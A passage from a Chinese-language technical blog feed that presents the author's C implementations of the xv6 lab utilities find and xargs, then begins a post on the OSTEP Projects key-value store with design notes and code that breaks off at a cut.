class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">file_name</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> path <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>p <span class="token operator">!=</span> <span class="token string">'/'</span><span class="token punctuation">;</span> <span class="token operator">--</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>p<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">dirent</span> de<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">,</span> <span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot open file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fstat</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot stat file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> T_FILE<span class="token operator">:</span>name <span class="token operator">=</span> <span class="token function">file_name</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T_DIR<span class="token operator">:</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// prevent infinite recursion</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>de<span class="token punctuation">.</span>inum <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// generate path of sub directory</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span><span class="token function">memmove</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> DIRSIZ<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">[</span>DIRSIZ<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">find</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">find</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>相较于 <code>find</code>，<code>xargs</code> 的实现就简单很多了。由于之前自己实现过一个简单的 shell，因此对于 <code>exec</code> 系统调用还算比较熟悉，本题的主要内容就是根据 <code>argv</code> 和标准输入构造一个新的参数列表，作为指定命令行程序的参数，并使用 <code>exec</code> 来进行调用。</p><p>程序的流程比较简单，这里不过多介绍，直接查看完整代码即可。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/xargs.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/param.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> nargv<span class="token punctuation">[</span>MAXARG<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> MAXARG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// remove last '\n'</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>nargv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">exec</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nargv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"xargs: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Boot-xv6&quot;&gt;&lt;a href=&quot;#Boot-xv6&quot; class=&quot;headerlink&quot; title=&quot;Boot xv6&quot;&gt;&lt;/a&gt;Boot xv6&lt;/h1&gt;&lt;p&gt;按照示例切换到 &lt;code&gt;util&lt;/code&gt; 分支后，看到目录下包含 &lt;code&gt;Ma</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projects：KV</title>
    <link href="http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/"/>
    <id>http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/</id>
    <published>2024-05-08T01:03:08.000Z</published>
    <updated>2024-05-10T13:16:13.024Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 KV 部分，包含个人的代码实现和设计思路。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目要求实现一个最简单的数据库，以支持数据的持久化。</p><p>每个操作由格式为 <code>op,[arg1],[arg2]</code> 的命令给出，那么首先要解决的问题就是参数的分离，再根据操作符 op 来对不同的操作进行特殊处理。字符串划分这里采用的是 <code>strsep()</code> 函数：该函数接收两个参数 <code>char** stringp</code> 和 <code>const char* delim</code>，<code>stringp</code> 是指向待分割字符串 <code>string</code> 的指针，<code>delim</code> 则是指定的分隔符，该函数的操作是查找 <code>string</code> 中第一个 <code>delim</code> 的位置 <code>it</code>，并将 <code>stringp</code> 指向 <code>string</code> 中 <code>it + 1</code> 的位置，同时返回<code>string</code> 开头到  <code>it</code> 所有字符所构成的子串（加上 <code>&#39;\0&#39;</code> 终结符）。</p><p>插入操作没什么好说的，直接使用 <code>fprintf()</code> 写入文件即可。对于查找和删除，则需要将数据从文件（数据库）中读取到内存，存储在特定的数据结构中，例如哈希表、红黑树等，但为了代码实现的简单，我使用的是最简单的链表。对于查找，先将所有数据读取到一个链表中，然后按顺序逐个进行查找；对于删除，将所有数据读取到一个链表中，然后逐个遍历链表，如果当前结点的键（key）与参数不同，则写入文件中，否则，不写入（相当于删除）。最后，为了防止内存的泄露，需要在每次结束查找和删除操作之后，将存储数据内容的链表结点的内存空间释放。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DATA_BASE</span> <span class="token string">"./database.txt"</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span><span class="token comment">// 从文件fp中读取数据</span>line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 哨兵结点</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 释放链表内存空间</span><span class="token keyword">void</span> <span class="token function">free_list_mem</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> data<span class="token punctuation">;</span>data <span class="token operator">=</span> data<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> op <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 操作符</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> value <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s,%s\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份（line_buf会被strsep()修改）</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 找到key</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s not found\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 清空文件</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token 